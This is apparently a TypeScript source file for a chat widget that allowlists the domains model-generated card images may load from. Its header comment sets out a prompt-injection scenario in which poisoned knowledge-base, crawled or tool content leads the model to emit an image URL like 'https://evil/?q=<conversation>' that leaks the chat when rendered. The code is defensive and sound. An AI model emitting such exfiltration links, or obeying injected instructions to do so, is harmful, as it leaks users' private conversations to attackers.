/**
 * 卡片图片的域名白名单（2026-09-30 安全审查 M7）。
 *
 * 卡片 image 节点的地址由模型生成，而模型可被知识库 / 爬取页面 / 工具返回里的提示注入操纵：让它输出
 * `https://evil/?q=<对话内容>` 的图片，挂件一渲染就自动请求、把对话外带出去。只有命中租户配置的图片域名
 * （`/open/v1/widget/config` 下发的 imageDomains）才自动加载，其余只显示为需要访客主动点击的链接。
 *
 * ⚠️ 管理后台 `frontend/src/lib/imagePolicy.ts` 有一份同逻辑的实现（两个独立构建目标没有共享模块的通道），
 * 改匹配规则时两边一起改。
 *
 * @author ruan
 */

let allowedDomains: string[] = [];

/** 挂载时由配置设置一次；空数组表示一律不自动加载 */
export function setImageDomains(domains: string[] | undefined): void {
  allowedDomains = (domains ?? []).map((d) => d.trim().toLowerCase()).filter(Boolean);
}

/**
 * 主机名是否命中白名单：精确匹配，或 `*.example.com` 匹配其任意子域（不含 example.com 本身）。
 * 地址解析失败一律视为不放行。
 */
export function isImageHostAllowed(url: string, domains: string[] = allowedDomains): boolean {
  let host: string;
  try {
    host = new URL(url).hostname.toLowerCase();
  } catch {
    return false;
  }
  return domains.some((d) => (d.startsWith('*.') ? host.endsWith(d.slice(1)) : host === d));
}
